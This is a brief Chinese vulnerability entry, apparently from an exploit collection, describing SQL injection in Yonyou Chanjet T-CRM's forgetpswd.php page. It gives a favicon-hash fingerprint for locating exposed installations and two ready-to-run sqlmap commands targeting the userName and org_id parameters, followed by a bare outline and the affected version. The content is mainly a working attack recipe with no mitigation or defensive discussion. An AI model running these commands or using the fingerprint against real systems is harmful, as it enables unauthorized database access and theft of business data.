# 用友畅捷通CRMforgetpswd存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.icon=="223dcd70f982801e9177078a818a9b59"`

**请求体 / payload**
```
python3 sqlmap.py -u "http://xx.xx.xx.xx/login/forgetpswd.php?userName=crm&org_id=113" --batch -p userName
python3 sqlmap.py -u "http://xx.xx.xx.xx/login/forgetpswd.php?userName=crm&org_id=113" --batch -p org_id
```

**其他**
- 用友畅捷通CRM forgetpswd存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友畅捷通T-CRM